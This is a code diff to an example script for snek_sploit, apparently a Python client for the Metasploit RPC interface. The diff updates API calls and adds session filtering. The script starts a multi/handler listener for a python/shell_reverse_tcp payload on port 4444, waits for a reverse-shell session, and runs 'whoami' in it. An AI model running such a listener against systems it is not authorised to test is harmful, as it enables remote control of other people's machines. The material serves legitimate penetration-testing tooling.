@@ -1,12 +1,12 @@
 import time
 
-from snek_sploit import Client, ModuleType
+from snek_sploit import Client, ModuleType, SessionInformation
 
 
 if __name__ == '__main__':
     client = Client("msf", "root", disable_https_warnings=True)
 
-    execution = client.module.rpc.execute(
+    execution = client.modules.rpc.execute(
         ModuleType.exploit,
         "multi/handler",
         {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444}
@@ -15,14 +15,13 @@ if __name__ == '__main__':
     print("Once you connect to it, the script will continue... ")
     # Code used to create the connection can be either generated using the msfvenom
     # or taking a look into tests/e2e/test.py (`create_connection("localhost")`)
-
-    while client.session.rpc.list_sessions() == {}:
+    session_to_match = SessionInformation(via_exploit="multi/handler", via_payload="python/shell_reverse_tcp")
+    while (sessions := client.sessions.filter(session_to_match)) is None:
         time.sleep(1)
 
-    session_id = list(client.session.rpc.list_sessions().keys())[-1]
-    print(f"Session {session_id} created!")
-    client.session.rpc.shell_write(session_id, 'whoami')
-    print("Executed `whoami` command in the opened session... ")
+    session_id = list(sessions.keys())[-1]
+    shell = client.sessions.get(session_id)
+    print(f"Executing command `whoami` in the session {session_id}... ")
+    shell.write('whoami')
     time.sleep(3)
-    result = client.session.rpc.shell_read(session_id)
-    print(f"Result: {result}")
+    print(f"Result: {shell.read()}")
